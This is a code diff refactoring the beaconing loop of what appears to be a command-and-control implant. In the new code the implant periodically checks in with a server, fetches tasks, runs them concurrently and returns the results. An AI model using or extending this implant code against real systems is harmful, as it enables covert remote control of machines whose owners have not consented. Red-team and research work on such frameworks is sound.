@@ -21,10 +21,9 @@ package c2
 import (
 	// {{if .Config.Debug}}
 	"log"
+
 	// {{end}}
 
-	"errors"
-	insecureRand "math/rand"
 	"sync"
 	"time"
 
@@ -48,94 +47,141 @@ func init() {
 	BeaconID = id.String()
 }
 
-// ServeBeacon - Loop and continuously perform
-// beaconing according to the transport settings.
-func (t *C2) ServeBeacon() {
+// Beacon - A Beacon is a slightly more evolved type of Channel, but only so: under the hood,
+// a beacon is continually spawning Session types, communicates over them with the server for
+// a brief period, and cleans everything up.
+type Beacon struct {
+	*transports.Driver               // Base
+	*sync.WaitGroup                  // Manage when beaconing runs are over
+	mutex              *sync.RWMutex // Need to update fields between potentially simultaneous runs.
+	closed             chan struct{} // Notify the beaconing loop goroutine we're closed
+}
 
-	// Create a new beacon base type, which is passed to specialized C2 channels
-	t.mutex.RLock()
-	t.Beacon = &beacon{
-		interval:   t.Profile.Interval,
-		jitter:     t.Profile.Jitter,
-		connection: t.Connection,
-		wg:         &sync.WaitGroup{},
+// NewBeacon - Instantiate a new Beacon type, for beacon-style communication with the server.
+func NewBeacon(t *transports.Driver) (b *Beacon) {
+	b = &Beacon{
+		Driver:    t,                      // Base methods and C2 profile information
+		WaitGroup: &sync.WaitGroup{},      // Concurrency
+		mutex:     &sync.RWMutex{},        // Concurrency
+		closed:    make(chan struct{}, 1), // Notify ourselves we're closed
 	}
-	t.mutex.RUnlock()
+	return
+}
 
+// Start - Start the complete C2 stack for the first time (actually
+// sets up a Session) over which we will register this beacon.
+func (b *Beacon) Start() (err error) {
+	// {{if .Config.Debug}}
+	log.Printf("Running in Beacon mode (Transport ID: %s)", b.ID)
+	// {{end}}
+
+	// The transport is not closed anymore, if it was
+	b.closed = make(chan struct{}, 1)
+
+	// We simply return without connecting anywhere:
+	// each connection is handled either through the
+	// beacon loop, or through one-off Send() calls,
+	// which are used to register us.
+	return
+}
+
+// Serve - Slightly different from a Session.Serve() method: here the beacon
+// will enter into a loop in which it does beaconing open/task/close runs, until
+// exhausted with errors. This loop works according to the C2 Profile specifications.
+// The error channel is passed by the caller so that he can monitor for error-caused
+// closures of this transport, for automatic fallback purposes.
+func (b *Beacon) Serve(errs chan error) {
+
+LOOP:
 	for {
-		// Only exit when we have reached the maximum number
-		// of connection failures for this precise beaconing
-		// Warn the transports that we are exhausted
-		if t.failures > int(t.Profile.MaxConnectionErrors) {
-			Transports.transportErrors <- ErrMaxAttempts
-			return
-		}
-
 		// Get a new duration for this coming beaconing.
-		duration := t.Duration()
-
-		// Run a beaconing process (connect, set up RPC, process tasks)
-		// In the background so that if tasks do not complete, does not
-		// block any next runs and their associated tasks.
-		go t.HandleBeaconTasks(duration)
+		duration := b.Duration()
 
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
 		// {{end}}
 
-		// Wait until either:
+		// Wait until either...
 		select {
-		case <-t.closed: // The transport has been shutdown by a user
-			t.Beacon.wg.Wait()     // Wait for all beaconing runs to complete
-			t.closed <- struct{}{} // And acklowledge we're closed
 
-		case <-time.After(duration): // The beaconing interval has elapsed
-			t.Beacon.wg.Wait() // Wait for all beaconing runs to complete
-			// TODO: This defeats the whole point of running beacons
-			// in a goroutine, but for now there is a problem with
-			// underlying connection access synchronization.
+		// ... The transport has been shutdown by a user
+		case <-b.closed:
+			b.Wait()               // Wait for all beaconing runs to complete
+			b.closed <- struct{}{} // And acklowledge we're closed
+			break LOOP
+
+		// ... The beaconing interval has elapsed
+		case <-time.After(duration):
 		}
+
+		// Only exit when we have reached the maximum number
+		// of connection failures for this precise beaconing
+		// Warn the transports that we are exhausted.
+		// Note that this might fail even before the first beaconing
+		// run: when attempting to connect. But if that was the case
+		// we would not get to that point anyway.
+		if _, failures := b.Statistics(); failures == int(b.MaxConnectionErrors) {
+			Transports.transportErrors <- ErrMaxAttempts
+			return
+		}
+
+		// Run a beaconing process (connect, set up RPC, process tasks)
+		// In the background so that if tasks do not complete, does not
+		// block any next runs and their associated tasks.
+		go b.BeaconOnce(duration)
+
 	}
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] Exiting beaconing loop")
 	// {{end}}
 }
 
-// HandleBeaconTasks - Listens for tasks, executes them and sends the results in the background,
-func (t *C2) HandleBeaconTasks(duration time.Duration) {
+// BeaconOnce - Starts the complete C2 stack (creates a Session), checkin with the server,
+// receive any pending task, executes them and wait until done, sends results and closes the stack.
+func (b *Beacon) BeaconOnce(duration time.Duration) (err error) {
 
 	// Notify a routine is owning the underlying connection stack, no one
 	// should either restart it or shut any of its components down.
-	t.Beacon.wg.Add(1)
-	defer t.Beacon.wg.Done()
+	b.Add(1)
+	defer b.Done()
 
-	// Setup the physical connection if needed (will return without errors if not)
-	err := t.startTransport()
+	// Make a copy of our own driver by instantiating a new one,
+	// also transfering attempts, failures, etc, so that this child
+	// driver will not overflow on the number of maximum attempts.
+	// This driver is the sole one in charge for this beaconing.
+	driver, err := transports.NewTransportFromExisting(b.Driver)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Error starting connection: %s", err)
+		log.Printf("Error creating beaconing transport driver: %s", err)
+		// {{end}}
+		b.FailedAttempt()
+		return
+	}
+	defer b.RefreshStatistics(driver)
+
+	// Instantiate a new Session around this transport driver:
+	// this provides with either/and/or the TLV ReadWriter system,
+	// and any session-based C2 channel.
+	session := NewSession(driver)
+
+	// We're now ready to start the Session per-se, which can be ranging from
+	// simply wrapping an underlying net.Conn with a TLV ReadWriter on top, or
+	// implement a complete session in the original technical meaning, when the
+	// C2 Channel is based on HTTP or DNS.
+	err = session.Start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error starting beaconing session: %s", err)
 		// {{end}}
 		return
 	}
-
-	// Setup the session connection. This is always needed
-	err = t.StartSession()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Error setting up connection: %s", err)
-		// {{end}}
-		return
-	}
-
-	// Recreate a new, clean session layer when we use beacons.
-	t.Beacon.connection = t.Connection
-	defer t.Beacon.connection.Close()
+	defer session.Close()
 
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] sending check in ...")
 	// {{end}}
 	nextCheckin := time.Now().Add(duration)
-	t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
+	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:          BeaconID,
 		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
@@ -146,7 +192,7 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] recv task(s) ...")
 	// {{end}}
-	envelope, err := t.Beacon.Recv()
+	envelope, err := session.Connection.Receive()
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[beacon] recv failure %s", err)
@@ -169,29 +215,28 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 	}
 
 	// Start executing all tasks concurrently, and wait until they complete.
-	results := t.ExecuteBeaconTasks(tasks.Tasks)
+	results := b.ExecuteTasks(tasks.Tasks)
 
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] all tasks completed, sending results to server")
 	// {{end}}
 
-	err = t.Beacon.Send(Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
+	// Send the results back to the server: the underlying connection stack
+	// will not be closed until the beacon has tried to write them to it.
+	session.Send(transports.Envelope(pb.MsgBeaconTasks, &pb.BeaconTasks{
 		ID:    BeaconID,
 		Tasks: results,
 	}))
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] error sending results %s", err)
-		// {{end}}
-	}
+
 	// {{if .Config.Debug}}
 	log.Printf("[beacon] all results sent to server, cleanup ...")
 	// {{end}}
+	return
 }
 
-// ExecuteBeaconTasks - Concurrently performs all the tasks in a request and
+// ExecuteTasks - Concurrently performs all the tasks in a request and
 // populate the results. This blocks until all goroutines have finished.
-func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
+func (b *Beacon) ExecuteTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 	wg := &sync.WaitGroup{}
 	resultsMutex := &sync.Mutex{}
 
@@ -258,48 +303,73 @@ func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 	return
 }
 
-// beacon - base beaconing implementation: connection setup and orchestration logic
-type beacon struct {
-	interval   int64
-	jitter     int64
-	duration   time.Duration
-	connection *transports.Connection
-	wg         *sync.WaitGroup // synchronize access to the underlying connection/session
-}
+// Send - Again, the beacon's Send() method is a bit more complicated than Sessions':
+// it starts a complete protocol stack and a Session on top, write the message and exits.
+func (b *Beacon) Send(req *pb.Envelope) {
 
-// Recv - Receive a a task from the server. Blocks until one is received.
-func (b *beacon) Recv() (*pb.Envelope, error) {
-	incoming := b.connection.RequestRecv()
+	// Make a copy of our own driver by instantiating a new one.
+	// This driver is the sole one in charge for this beaconing.
+	driver, err := transports.NewTransportFromProfile(b.Profile())
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error creating beaconing transport driver: %s", err)
+		// {{end}}
+		b.FailedAttempt()
+		return
+	}
 
-	// Wait for and read one envelope and return
-	for envelope := range incoming {
-		if envelope == nil {
-			return nil, errors.New("received nil envelope from underlying TLV connection")
+	// At the end of the run, update our own driver with
+	// attempt/failures from the copy, beaconing one.
+
+	// Instantiate a new Session around this transport driver.
+	session := NewSession(driver)
+
+	// We're now ready to start the Session per-se.
+	err = session.Start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Error starting beaconing session: %s", err)
+		// {{end}}
+		return
+	}
+	defer func() {
+		err = session.Close()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Error closing beaconing session: %s", err)
+			// {{end}}
 		}
-		return envelope, nil
-	}
-	return nil, errors.New("did not received any envelope in Recv call")
+	}()
+
+	// Write the envelope to the connection
+	session.Send(req)
 }
 
-// Send - Send the results or part of a task output back to server. Not blocking
-func (b *beacon) Send(envelope *pb.Envelope) error {
-	b.connection.RequestSend(envelope)
-	return nil
+// Close - Notifies the beacon serve goroutine that we must close, so no more runs.
+// This waits until this beaconing routine acklowledges our notice, and exits.
+func (b *Beacon) Close() (err error) {
+	b.closed <- struct{}{}
+	<-b.closed // wait for it to confirm
+	return
 }
 
-// Duration - Compute the duration needed for this transport
-func (t *C2) Duration() time.Duration {
-	p := t.Profile
-	// {{if .Config.Debug}}
-	log.Printf("Interval: %v Jitter: %v", p.Interval, p.Jitter)
-	// {{end}}
-	jitterDuration := time.Duration(0)
-	if 0 < p.Jitter {
-		jitterDuration = time.Duration(int64(insecureRand.Intn(int(p.Jitter))))
+// RefreshStatistics - Because a beacon Channel instantiates a new driver & transport
+// stack at each beacon checkin, we need to pass its statistics back to the caller, so
+// we can still abide with the Profile attempts/failures specifications.
+// The returned error is mainly used to signal we have reached our maximum.
+func (b *Beacon) RefreshStatistics(child *transports.Driver) (err error) {
+	b.mutex.RLock()
+	defer b.mutex.RUnlock()
+	b.NewAttempt() // Equivalent of the NewAttempt() call in driver Connect()
+
+	// We only consider failures, as we have a new attempt added
+	// each time the driver starts, and automatically counted.
+	_, childFailures := child.Statistics()
+	_, parentFailures := b.Statistics()
+
+	// Increase our counter of failures for the last beacon checkin
+	for i := 0; i < (childFailures - parentFailures); i++ {
+		b.FailedAttempt()
 	}
-	duration := time.Duration(p.Interval) + jitterDuration
-	// {{if .Config.Debug}}
-	log.Printf("Duration: %v", duration)
-	// {{end}}
-	return duration
+	return
 }
